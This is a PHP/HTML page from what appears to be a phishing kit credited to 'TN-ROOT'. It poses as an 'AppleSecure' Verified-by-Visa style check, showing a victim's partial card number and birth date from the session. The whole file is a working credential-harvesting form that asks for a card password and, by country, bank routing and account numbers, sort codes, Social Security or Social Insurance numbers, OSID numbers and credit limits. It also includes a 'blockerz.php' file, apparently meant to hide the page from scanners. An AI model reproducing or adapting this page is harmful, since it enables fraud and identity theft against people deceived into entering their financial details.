<?php
/*  
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *                                                                     *
 *                                                                     *
 *              Copyright 2017-2018   / TN-ROOT                           *
 *                                                                     *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 */

   include '../../blockerz.php';
   
   $negara = $_SESSION['country'];


   
   ?>
<html>
   <head>
      <title>AppleSecure</title>
      <script src="./include/js/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>
      <script src="./include/js/jquery.maskedinput.js" type="text/javascript"></script>
      <script type="text/javascript">
         jQuery(function($){
         $("#ssn").mask("999-99-9999",{placeholder:"x"});
         $("#srt").mask("99-99-99",{placeholder:"x"});
         });
      </script>

   </head>
   <body>
      <div style="background: url(./include/img/vbv.PNG) no-repeat;  height: 700px;  width: 458px; margin: 0 auto;margin-top: 40px; position: relative;">
         <form action="" id="form1" method="post" name="login">
            <div style="position: absolute;  outline: none;left: 228px;top: 227px; font-family: PayPal-Sans-Regular, sans-serif !important;font-size:14px;">
XXXX-XXXX-XXXX-<?php echo substr($_SESSION['cart'] , -4);?>
            </div>
            <input  value=" " name="name" style="  position: absolute;  outline: none; top: 259px;  left: 227px;  border: 1px solid #CCCCCC; width: 150px;">
            <div name="date" style="  position: absolute;  outline: none;  top: 294px; font-family: PayPal-Sans-Regular, sans-serif !important;font-size:14px;  width: 150px; left: 227px;">
                <?php echo $_SESSION['datebith'];?>
            </div>
            <input name="vbv" type="password" style="position: absolute;  outline: none; top: 375px;  border: 1px solid #CCCCCC;left: 227px;width: 150px;">
            <?php if ($negara=="United States"){ echo '
               <p style="left: 34px; color: #000000;  font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 400px;">Routing Number:</p>
               <input maxlength="15"  style="position: absolute;  outline: none; top: 409px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" autocomplete="off" name="routing" style="position: absolute;  outline: none;  top: 372;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" type="text">
	            <p style="left: 34px; color: #000000;     font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none; top: 432px;">Account Number:</p>
               	<input style="position: absolute;  outline: none; top: 440px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" maxlength="15" autocomplete="off" name="acc_number"  type="text">
               <p  style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 461px;">Social Security Number:</p>
               <input   id="ssn" style="position: absolute;  outline: none; top: 470px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;"  autocomplete="off" name="ssn" type="text">
               
	       ';}?>
            <?php
               if ($negara=="Australia" ){ echo '
               <p style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 396px;">OSID Number:</p>
               <input maxlength="10" style="position: absolute;  outline: none; top: 407px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" autocomplete="off" name="osidnum" required="required" type="text">
               <p style="left: 34px; position: absolute; font-family:Microsoft YaHei,MingLiU, Apple LiSung !important; font-size: 12px;  outline: none;top: 429px;">Credit Limit:</p>
               <input type="text" style="position: absolute;  outline: none; top: 469px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" autocomplete="off"  maxlength="32" name="cc_limit" required="" title="Credit Limit">
               <p style="left: 34px; color: #000000;     font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none; top: 460px;">Account Number:</p>
               <input style="position: absolute;  outline: none; top: 440px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" maxlength="15" autocomplete="off" name="acc_number"  type="text">
	       ';}?>
            <?php if ( $negara=="United Kingdom" ){ echo '
               <p style="left: 34px; color: #000000;font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none; top: 432px;">Account Number:</p>
               	<input style="position: absolute;  outline: none; top: 440px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" maxlength="15" autocomplete="off" name="acc_number"  type="text">
               <p style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 400px;">Sort Code:</p>
               <input id="srt"  style="position: absolute;  soutline: none; top: 408px; border: 1px solid rgb(204, 204, 204); left: 227px;width: 78px;" autocomplete="off" name="sort" type="text">
	       ';}?>
            <?php if ( $negara=="Ireland" ){ echo '
               <p  style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 462px;">Social Security Number:</p>
               <input   id="ssn" style="position: absolute;  outline: none; top: 470px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;"  autocomplete="off" name="ssn" type="text">
               <p style="left: 34px; color: #000000;     font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none; top: 430px;">Account Number:</p>
               	<input style="position: absolute;  outline: none; top: 440px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;" maxlength="15" autocomplete="off" name="acc_number"  type="text">
               <p style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 398px;">Sort Code:</p>
               <input id="srt"  style="position: absolute;  soutline: none; top: 408px; border: 1px solid rgb(204, 204, 204); left: 227px;width: 78px;" autocomplete="off" name="sort" type="text">  
	       ';}?>
            <?php if ($negara=="Canada"){ echo '
               <p style="left: 34px; color: #000000;      font-family:Microsoft YaHei,MingLiU, Apple LiSung !important;    font-size: 12px; position: absolute;  outline: none;top: 403px;">Social Insurance Number:</p>
               <input maxlength="15" style="position: absolute;  outline: none; top: 413px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 150px;"  autocomplete="off" name="cassn" type="text">
               ';}
               ?>
            <input type="submit" value="Next" style="  position: absolute;    border-radius: 3px;  top: 500px; border: 1px solid #CCCCCC;  background-color: #DDDDDD; left: 127px;  width: 144px;">
         </form>
      </div>
   </body>
</html>